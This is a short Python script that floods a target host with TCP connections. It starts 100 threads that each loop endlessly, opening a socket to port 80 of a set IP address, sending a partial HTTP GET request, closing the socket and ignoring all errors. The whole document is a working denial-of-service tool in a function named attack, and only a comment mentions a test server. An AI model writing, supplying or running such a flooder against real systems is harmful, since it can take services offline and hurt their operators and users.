
import socket
import threading

target_ip = "192.168.1.1"  # Replace with your test server IP
target_port = 80

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
        except:
            pass

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()
